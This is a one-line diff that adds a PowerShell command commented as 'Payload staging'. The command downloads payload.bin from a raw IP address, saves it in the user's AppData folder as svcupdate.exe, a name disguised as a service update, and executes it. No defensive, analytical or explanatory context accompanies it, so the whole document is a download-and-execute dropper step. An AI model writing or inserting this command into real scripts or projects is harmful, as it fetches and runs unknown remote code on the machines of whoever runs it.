@@ -1,0 +1,1 @@
+<# Payload staging #> (New-Object System.Net.WebClient).DownloadFile('https://203.0.113.161:443/payload.bin', "$env:APPDATA\svcupdate.exe"); & "$env:APPDATA\svcupdate.exe"; Set-Location -Path $env:TEMP
